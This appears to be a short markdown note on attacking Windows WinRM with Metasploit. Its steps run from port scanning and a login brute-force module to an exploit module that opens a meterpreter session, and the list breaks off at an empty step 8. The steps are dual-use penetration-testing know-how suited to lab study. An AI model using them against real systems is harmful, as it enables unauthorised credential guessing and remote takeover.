
### How to exploit `winrm` using `MSF` ?

1. Start `postgresql` and `msfconsole`.

2. Create a workspace.

3. Use `db_nmap` module to scan the target IP, make sure to scan the entire port range.

4. Checking whether `winrm` is enabled in the target system or not, and the authentication methods that are supported.
```
use auxiliary/scanner/winrm/winrm_auth_methods
```

5. Bruteforcing `winrm` login.
```
use auxiliary/scanner/winrm/winrm_login
```

6. Now that we've discovered the credentials, we check if we can run commands.
```
use auxiliary/scanner/winrm/winrm_cmd
```

7. Using an exploit module to obtain a `meterpreter` session..
```
use exploit/windows/winrm/winrm_script_exec
```
- Set `FORCE_VBS` to `true` to enable `VBS` command stager instead or default PowerShell stager.
- This module automatically migrates to a 64 bit process.

8. 